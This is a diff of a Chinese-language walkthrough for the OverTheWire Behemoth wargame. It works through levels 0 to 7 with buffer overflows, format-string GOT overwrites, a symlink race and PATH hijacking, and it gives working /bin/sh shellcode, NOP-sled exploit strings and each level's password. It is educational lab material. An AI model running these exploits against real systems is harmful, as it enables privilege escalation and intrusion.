@@ -9,35 +9,9 @@ tags: [wargame-ctf,Behemoth]
 
 ---
 
-Behemoth wargame 是一些外界常见漏洞，包括缓冲区溢出,条件竞争和权限提升。
+Behemoth wargame 包括缓冲区溢出,权限提升,格式化字符串漏洞，一些绕过。
 
-## behemoth0 猜密码
-
-这道题网络不好的话，可以先把漏洞程序给dump下来,自用dump脚本。
-
-```bash
-#!/usr/bin/env bash
-
-###### preconfig here ##################
-
-hostname="behemoth.labs.overthewire.org"
-total_usr="behemoth"
-port=2221
-
-#########################################
-
-file="/$total_usr/$total_usr"
-
-# argument passed
-usrid=$1
-pass=$2
-
-echo "sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  ."
-
-sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  .
-
-checksec $total_usr$usrid
-```
+## behemoth0 
 
 **SSH:** ssh behemoth0@narnia.labs.overthewire.org -p 2221
 
@@ -86,17 +60,54 @@ aesebootiv
 
 成功。
 
-## Behemoth 01 栈溢出
+## Behemoth 01 
 
 **SSH**:  ssh behemoth1@narnia.labs.overthewire.org -p 2221
 
 **pass**: aesebootiv
 
+鉴于国内网络环境，可以先把漏洞程序给dump下来,先本地分析，分析好利用方案之后,再在远程上猛操。自用dump脚本。
+
 ```bash
-behemoth1@behemoth:/behemoth$ ./behemoth1
-Password: demo
-Authentication failure.
-Sorry.
+#!/usr/bin/env bash
+
+###### preconfig here ##################
+
+hostname="behemoth.labs.overthewire.org"
+total_usr="behemoth"
+port=2221
+
+#########################################
+
+file="/$total_usr/$total_usr"
+
+# argument passed
+usrid=$1
+pass=$2
+
+echo "sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  ."
+
+sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  .
+
+checksec $total_usr$usrid
+
+```
+
+dump 到本地慢慢分析：
+
+```bash
+$ ./crawl.sh  1 aesebootiv
+sshpass -p aesebootiv scp -P 2221 behemoth1@behemoth.labs.overthewire.org:/behemoth/behemoth1  .
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+[*] '/home/z1933/workplace/vbshare/ctf/behemoth1'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+
 ```
 
 ltrace试一下：
@@ -114,11 +125,9 @@ Sorry.
 
 这次不行。但是查看反汇编可以看到执行逻辑为：
 
-```main
-objdump behemoth1 -d
-```
+```bash
+$ objdump behemoth1 -d
 
-```
 0804844b <main>:
  804844b:	55                   	push   %ebp
  804844c:	89 e5                	mov    %esp,%ebp
@@ -186,7 +195,7 @@ native process 16351 In: main                                                   
 ```
 ebp+4也就是main函数返回地址的位置已经被覆盖了。
 
-这里还是用环境变量来写shellcode，因为不确定gdb中的栈地址和程序运行时的栈地址是不是一样的。秘制[shellcode](https://gist.github.com/Zhang1933/0d1c7b69af48483832eb2d6b22de287e)献上。
+还是用环境变量来写shellcode，因为不确定gdb中的栈地址和程序运行时的栈地址是不是一样的。秘制[shellcode](https://gist.github.com/Zhang1933/0d1c7b69af48483832eb2d6b22de287e)献上。
 
 ```bash
 export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')
@@ -238,9 +247,9 @@ eimahquuof
 
 最好还是python2来写，之前用python3写发现输入的数据不对。
 
-下面跟我一起用热门反汇编工具IDA来解题,顺便熟悉IDA的使用。
+下面我直接用热门反汇编工具IDA来解题,顺便熟悉IDA的使用。
 
-## Behemoth 02 流程分析
+## Behemoth 02 
 
 **SSH:** ssh behemoth2@narnia.labs.overthewire.org -p 2221
 
@@ -307,14 +316,16 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 1. buffer里面写入`touch $pid`
 2. name的值就是pid，lstat因为没有这个文件会返回FFFF，条件判断会一直判断为真。
-3. 执行system(touch $pid).
+3. 无脑执行system(touch $pid).
 
     关于setreuid函数的参数,Real User ID, Effective UserId,Saved User ID 可以参考[Difference between Real User ID, Effective User ID and Saved User ID](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id)
 
-所以我们可以创建一个touch文件,写入:
+所以我们可以创建一个假的touch文件,写入:
 ```
 /bin/sh
 ```
+
+执行这个touch的话,系统会执行`/bin/sh`。关于这个和shellbang的关系，可以参考[Why should the shebang line always be the first line?](https://stackoverflow.com/questions/12910744/why-should-the-shebang-line-always-be-the-first-line)。
 
 ```bash
 behemoth2@behemoth:~$ cd /tmp/
@@ -331,7 +342,7 @@ $ cat /etc/behemoth_pass/behemoth3
 nieteidiel
 ```
 
-## Behemoth 03 格式化字符串
+## Behemoth 03 
 
 **SSH :** ssh behemoth3@narnia.labs.overthewire.org -p 2221
 
@@ -357,6 +368,7 @@ This is a OverTheWire game server. More information on http://www.overthewire.or
 ```
 
 IDA反编译结果：
+
 ```cpp
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
@@ -381,7 +393,11 @@ Welcome, 0x252c7025,0xa70
 aaaand goodbye again.
 ```
 
+补充一下前置知识，已经知道的可以跳过。
+
 ---
+
+**动态链接过程的延迟绑定:**
 
 关于详细动态链接，(延迟绑定) lazy binding 可以参考[GOT and PLT for pwning.](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html),以及书《CSAPP》中7.12节 `Position-Independent Code(PIC)`。
 
@@ -404,20 +420,21 @@ aaaand goodbye again.
 
 &ensp;&ensp;&ensp;&ensp;4. PLT[0]通过GOT[1]间接地把动态链接器第一个参数入栈，然后通过GOT[2]间接跳转到动态连接器中。动态链接器确定`printf`的运行时位置后用这个地址重写printf对应的GOT条目。再把控制传递给`printf`。
 
-&ensp;&ensp;**下一次调用`printf`过程**
-和上面步骤一样，不同的是`printf`对应的GOT表项有`printf`函数的地址了，步骤2就可以直接跳转到`printf`函数地址了。
+&ensp;&ensp; **下一次调用`printf`过程** 和上面步骤一样，不同的是`printf`对应的GOT表项有`printf`函数的地址了，步骤2就可以直接跳转到`printf`函数地址了。
 
 ---
 
 上述就是延迟绑定的过程,现在让我们回到这道题中来。
 
-关于格式化字符串漏洞可以参考这篇[文章](https://axcheron.github.io/exploit-101-format-strings/#random-write)。这里简单说下利用原理。
 
----
 
 可以看出`.got.plt`节是一个可写的存有函数指针的数组,并且加载到内存中的地址还可以预测,我们利用字符串格式漏洞 **任意地址写** 来完成。
 
-关于格式化字符，需要知道：
+---
+
+**格式化字符任意写原理:**
+
+关于格式化字符串漏洞可以参考这篇[文章](https://axcheron.github.io/exploit-101-format-strings/#random-write)。这里简单说下利用原理。
 
 * 可以用`%<num>$n`来指定写入位置,`%n`接受的是一个地址参数，将会在那个地址里面写入。`%<num>$s`可以指定读位置,同样接受的是地址参数。比如`printf("%2$x", 1, 2, 3)`将会打印2。
 * `AAAA%96x%7$n`将会在第七个(从0开始,第0个参数是format字符串指针)参数地址所对应的内存上写100。
@@ -462,6 +479,7 @@ ietheishei
 
 ---
 
+**RELRO机制:**
 
 用RELRO机制防止GOT表被写可以参考[Hardening ELF binaries using Relocation Read-Only (RELRO)](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro)。
 
@@ -471,4 +489,361 @@ FULL RELRO 除了干Partial RELRO要干的事情的以外，会在程序一开�
 
 ---
 
+## Behemoth 04
+
+**SSH :** ssh behemoth4@narnia.labs.overthewire.org -p 2221
+
+**Pass :** ietheishei
+
+还是先dump下来,扔到IDA中反汇编分析。
+
+```bash
+$ ./crawl.sh 4 ietheishei
+sshpass -p ietheishei scp -P 2221 behemoth4@behemoth.labs.overthewire.org:/behemoth/behemoth4  .
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+[*] '/home/z1933/workplace/vbshare/ctf/behemoth4'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+```
+
+反编译结果,改了一些变量名:
+
+```cpp
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buffer[20]; // [esp+0h] [ebp-28h] BYREF
+  int c; // [esp+14h] [ebp-14h]
+  FILE *stream; // [esp+18h] [ebp-10h]
+  __pid_t pid; // [esp+1Ch] [ebp-Ch]
+
+  pid = getpid();
+  sprintf(buffer, "/tmp/%d", pid);
+  stream = fopen(buffer, "r");
+  if ( stream )
+  {
+    sleep(1u);
+    puts("Finished sleeping, fgetcing");
+    while ( 1 )
+    {
+      c = fgetc(stream);
+      if ( c == -1 )
+        break;
+      putchar(c);
+    }
+    fclose(stream);
+  }
+  else
+  {
+    puts("PID not found!");
+  }
+  return 0;
+}
+```
+
+可以看出程序逻辑大概是: 读文件"/tmp/$pid"，并输出。如果没有要读的文件就退出。
+
+所以思路就是在程序开始时将他挂起(kill -STOP命令)，然后创建密码软链接,然后让程序接着执行，让他读出包含密码的文件。写个test.sh脚本：
+
+```bash
+/behemoth/behemoth4& # 后台执行
+PID=$! # $! 得到最近一次后台执行的命令的pid
+kill -STOP $PID
+ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
+kill -CONT $PID
+echo $PID
+```
+
+---
+
+关于`$!`可以参考[In Bash scripting, what's the meaning of " $! "?](https://unix.stackexchange.com/questions/85021/in-bash-scripting-whats-the-meaning-of)
+
+---
+
+总的过程:
+```sh
+behemoth4@behemoth:~$ vim /tmp/demo.sh
+behemoth4@behemoth:~$ bash /tmp/demo.sh
+24945
+behemoth4@behemoth:~$ Finished sleeping, fgetcing
+aizeeshing
+```
+
+## Behemoth 05
+
+**SSH :** ssh behemoth5@narnia.labs.overthewire.org -p 2221
+
+**Pass :** aizeeshing
+
+日常dump下来：
+
+```bash
+$ ./crawl.sh 5 aizeeshing
+sshpass -p aizeeshing scp -P 2221 behemoth5@behemoth.labs.overthewire.org:/behemoth/behemoth5  .
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+[*] '/home/z1933/workplace/vbshare/ctf/behemoth5'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+IDA没看出什么，搭建本地环境用ltrace执行看下是个什么情况：
+
+切成sudo用户：
+```bash
+$ mkdir /etc/behemoth_pass
+$ echo abcd > /etc/behemoth_pass/behemoth6
+```
+
+再切回普通用户:
+```bash
+└─$ ltrace ./behemoth5
+__libc_start_main(0x804872b, 1, 0xffffd264, 0x8048920 <unfinished ...>
+fopen("/etc/behemoth_pass/behemoth6", "r")       = 0x804b1a0
+fseek(0x804b1a0, 0, 2, 0xf7fa8a08)               = 0
+ftell(0x804b1a0, 0, 2, 0xf7fa8a08)               = 5
+rewind(0x804b1a0, 0, 2, 0xf7fa8a08)              = 0
+malloc(6)                                        = 0x804c2f0
+fgets("abcd\n", 6, 0x804b1a0)                    = 0x804c2f0
+strlen("abcd\n")                                 = 5
+fclose(0x804b1a0)                                = 0
+gethostbyname("localhost")                       = 0xf7fa9fb8
+socket(2, 2, 0)                                  = 3
+atoi(0x80489e4, 2, 0, 0xf7fa8a08)                = 1337
+htons(1337, 2, 0, 0xf7fa8a08)                    = 0x3905
+memset(0xffffd180, '\0', 8)                      = 0xffffd180
+strlen("abcd\n")                                 = 5
+sendto(3, 0x804c2f0, 5, 0)                       = 5
+close(3)                                         = 0
+exit(0 <no return ...>
++++ exited (status 0) +++
+```
+
+用IDA反编译分析把逻辑还原了一下，从发包开始。下面代码可以复制到现代编辑器里面查看函数，常亮的定义慢慢理解:
+
+```cpp
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include<netinet/in.h>
+#include <netdb.h>
+#include<string.h>
+// gcc -z execstack -z norelro -fno-stack-protector -o format1 format1.c
+int main(int argc, char *argv[]){
+    // ... 
+    char *passcontent;
+
+
+    struct hostent *host;
+   /*  sockaddr_in 和 sockaddr区别： https://www.iteye.com/blog/kenby-1149001
+    */
+    struct sockaddr_in addr;
+    host=gethostbyname("loacalhost");
+    int fd=socket(AF_INET,SOCK_DGRAM,0);// 0:IP 协议
+    addr.sin_family=AF_INET;
+    addr.sin_port=1337;
+    addr.sin_addr.s_addr=**host->h_addr_list;
+    int stat=sendto(fd,passcontent,strlen(passcontent),0,( struct sockaddr *)&addr,sizeof(addr));// 发数据
+    if(stat==-1){
+        perror("sendto");
+        exit(1);
+    }
+    // ...
+}
+```
+
+这里大概说一下逻辑: 读文件并发包，发udp包到本地端口1337。所以我们需要开一个本地监听udp包的1337端口，然后再起一个终端调用`behemoth5`让他乖乖发数据发过来就ok了。
+
+```bash
+# shell 1
+behemoth5@behemoth:~$ nc -ulp 1337
+
+# shell 2
+behemoth5@behemoth:/behemoth$ ./behemoth5
+
+# shell  1 输出：
+behemoth5@behemoth:~$ nc -ulp 1337
+mayiroeche
+
+```
+
+## behemoth 06
+
+**SSH:** ssh behemoth6@narnia.labs.overthewire.org -p 2221
+
+**pass:** mayiroeche
+
+这次有两个文件，先把第一个文件dump下来。
+
+```bash
+$ ./crawl.sh 6 mayiroeche
+sshpass -p mayiroeche scp -P 2221 behemoth6@behemoth.labs.overthewire.org:/behemoth/behemoth6  .
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+[*] '/home/z1933/workplace/vbshare/ctf/behemoth6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+```
+把`behemoth6_reader` 也dump下来。
+```bash
+sshpass -p mayiroeche scp -P 2221 behemoth6@behemoth.labs.overthewire.org:/behemoth/behemoth6_reader .
+```
+
+都拿到IDA中反编译分析一波。
+
+可以看出大概逻辑是behemoth6需要接受behemoth6_reader的输出，输出需要是`HelloKitty`。`behemoth6_reader`读取`shellcode.txt`字节并执行，但shellcode字节内容+字节下标不能等于11,避开前11检查的办法可以填充`0x90`至到11。
+
+好吧，这道题就是写一个汇编程序的输出`HelloKitty`的shellcode,提取出机器码就ok了。
+
+关于如何写可以参考[Linux Shellcode "Hello, World!"](https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world)
+
+HelloKitty.s文件中写入:
+
+```
+global _start
+
+section .text
+
+_start:
+    jmp MESSAGE      ; 1) lets jump to MESSAGE
+
+GOBACK:
+    mov eax, 0x4
+    mov ebx, 0x1
+    pop ecx          ; 3) we are poping into `ecx`, now we have the
+                     ; address of "Hello, World!\r\n" 
+    mov edx, 0xa
+    int 0x80
+
+    mov eax, 0x1
+    mov ebx, 0x0
+    int 0x80
+
+MESSAGE:
+    call GOBACK       ; 2) we are going back, since we used `call`, that means
+                      ; the return address, which is in this case the address 
+                      ; of "Hello, World!\r\n", is pushed into the stack.
+    db "HelloKitty"
+
+section .data
+```
+
+```bash
+$ nasm -f elf HelloKitty
+$ ld -m elf_i386 HelloKitty.o -o HelloKitty
+$ $ ./HelloKitty 
+HelloKitty
+```
+
+然后objdump提取：
+
+```bash
+objdump -d ./HelloKitty |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+```
+
+登录到远程开始操作:
+
+```bash
+behemoth6@behemoth:/tmp/eZqWxxwYkV$ (python -c "print 11*'\x90'+'\xeb\x1e\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0a\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79'") > shellcode.txt
+behemoth6@behemoth:/tmp/eZqWxxwYkV$ /behemoth/behemoth6
+Correct.
+$ whoami
+behemoth7
+$ cat /etc/behemoth_pass/behemoth7
+baquoxuafo
+$ 
+```
+
+## Behemoth 07
+
+
+**SSH:** ssh behemoth7@narnia.labs.overthewire.org -p 2221
+
+**PASS:** baquoxuafo
+
+依旧先dump下来分析。
+
+```bash
+$ ./crawl.sh  7 baquoxuafo
+sshpass -p baquoxuafo scp -P 2221 behemoth7@behemoth.labs.overthewire.org:/behemoth/behemoth7  .
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+[*] '/home/z1933/workplace/vbshare/ctf/behemoth7'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+用IDA分析一下。
+
+`__ctype_b_loc`函数参考：[__ctype_b_loc what is its purpose?](https://stackoverflow.com/questions/37702434/ctype-b-loc-what-is-its-purpose)。简单的说，这个函数就是返回一个ascii字符的表，表项(unsigned short)表示每个字符的特征，比如是否大小写，是否为打印字符等。isprintf，islower函数实际上就是包装了一下上面这个函数。
+
+这里要让其判断为假，要么是字母数字要么是标点符号。但是漏洞利用点是其只检查了前512字节,把shellcode地址写在后面就OK了。还有就是程序一开始把环境变量清0了,所以环境变量不行，只能在栈上加点雪橇硬写了。
+
+
+从ebp-524字节处开始写,用gdb调试,看一下栈上的情况:
+
+```
+(gdb) run $(python -c "print 528*'A'+'\xc0\xd5\xff\xff'+ 200*'\x90'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80'")
+Starting program: /behemoth/behemoth7 $(python -c "print 528*'A'+'\xc0\xd5\xff\xff'+ 200*'\x90'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80'")
+
+Breakpoint 1, 0x08048640 in main ()
+(gdb) x/300wx
+Argument required (starting display address).
+(gdb) x/300wx $ebp
+0xffffd2b8:	0x41414141	0xffffd5c0	0x90909090	0x90909090
+0xffffd2c8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd2d8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd2e8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd2f8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd308:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd318:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd328:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd338:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd348:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd358:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd368:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd378:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd388:	0x6850c031	0x68732f2f	0x69622f68	0x31e3896e
+0xffffd398:	0xb0d231c9	0xcd042c0f	0xffff0080	0xffffdeda
+0xffffd3a8:	0xffffdeed	0xffffdef9	0xffffdf12	0xffffdf22
+0xffffd3b8:	0xffffdf36	0xffffdf41	0xffffdf49	0xffffdf62
+0xffffd3c8:	0xffffdf74	0xffffdfb2	0xffffdfd0	0x00000000
+0xffffd3d8:	0x00000020	0xf7fd7c90	0x00000021	0xf7fd7000
+0xffffd3e8:	0x00000010	0x178bfbff	0x00000006	0x00001000
+0xffffd3f8:	0x00000011	0x00000064	0x00000003	0x08048034
+0xffffd408:	0x00000004	0x00000020	0x00000005	0x00000008
+0xffffd418:	0x00000007	0xf7fd9000	0x00000008	0x00000000
+0xffffd428:	0x00000009	0x08048430	0x0000000b	0x000032cf
+0xffffd438:	0x0000000c	0x000032cf	0x0000000d	0x000032cf
+0xffffd448:	0x0000000e	0x000032cf	0x00000017	0x00000001
+0xffffd458:	0x00000019	0xffffd48b	0x0000001a	0x00000000
+
+```
+
+选一个雪橇中间的位置,这里选择`0xffffd328`,返回地址写入`0xffffd328`,构造字符串:
+
+```bash
+behemoth7@behemoth:/behemoth$ ./behemoth7   $(python -c "print 528*'A'+'\x28\xd3\xff\xff'+ 200*'\x90'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80'")
+$ whoami
+behemoth8
+$ cat /etc/behemoth_pass/behemoth8
+pheewij7Ae
+$ 
+
+```
 
